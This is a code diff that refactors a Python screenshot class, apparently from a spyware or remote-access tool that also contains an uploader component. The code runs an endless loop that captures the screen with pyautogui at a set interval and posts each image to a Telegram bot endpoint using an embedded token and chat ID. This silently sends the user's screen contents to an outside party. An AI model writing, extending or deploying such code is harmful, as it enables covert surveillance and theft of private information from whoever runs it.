@@ -133,29 +133,33 @@ class Uploader:
         pass
 
 # Take screenshots periodically
-class ScreenshotCapture:
 
+class ScreenshotCapture:
     def __init__(self) -> None:
-        self.screenshot_filename = join(gettempdir(), 'screenshot.png')
+        pass
 
     def take_screenshot(self) -> None:
         try:
-            screenshot = pyautogui.screenshot()
-            screenshot.save(self.screenshot_filename)
-            with open(self.screenshot_filename, 'rb') as fh:
-                files = {'document': fh}
-                resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
+            # Take a screenshot and save it to a file
+            screenshot_filename = "screenshot.png"
+            pyautogui.screenshot(screenshot_filename)
+
+            # Send the screenshot to Telegram
+            with open(screenshot_filename, "rb") as fh:
+                files = {"document": fh}
+                resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}",files=files,)
 
                 if resp.status_code != 200:
-                    alarm(f'Screenshot Error Code: {resp.status_code}')
+                    alarm(f"Screenshot Error Code: {resp.status_code}")
 
         except Exception as e:
-            alarm(f'Screenshot Error: {e}')
+            alarm(f"Screenshot Error: {e}")
 
     def capture_periodically(self) -> None:
         while True:
             self.take_screenshot()
             sleep(SCREENSHOT_INTERVAL)
+
 
     def __del__(self) -> None:
         pass
